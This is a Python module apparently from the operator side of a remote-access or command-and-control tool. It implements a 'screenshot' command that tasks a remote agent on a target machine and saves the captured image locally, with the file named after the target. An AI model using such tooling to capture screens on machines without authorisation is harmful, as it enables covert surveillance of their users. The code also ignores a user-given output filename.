import time

from core.state import send_task
from core.state import TaskCode
from core.config import Paths
from core import state
from core import logging

def finish_screenshot(response, cache):
    if not response.success:
        logging.error("Failed to take screenshot")
        return False

    local_file = cache['local_file']

    try:
        with open(local_file, 'wb') as out_file:
            out_file.write(response.return_data)
        logging.success("Saved to {0}".format(local_file))
    except:
        logging.error("Failed to write to {0}".format(local_file))
        

def do_screenshot(self, command):
    """
    screenshots a file from the remote agent to the LP

    Syntax:
        screenshot
        screenshot <outfile.jpg>
    """

    if not command and state.ActiveTarget:
        command = Paths.Downloads + "{0}_{1}.jpg".format(state.ActiveTarget.machine_name, time.strftime("%b%d_%H%M%S", time.gmtime()))
    else:
        command = Paths.Downloads + "screenshot.jpg"

    send_task(TaskCode.ScreenShot, cache = {'local_file': command})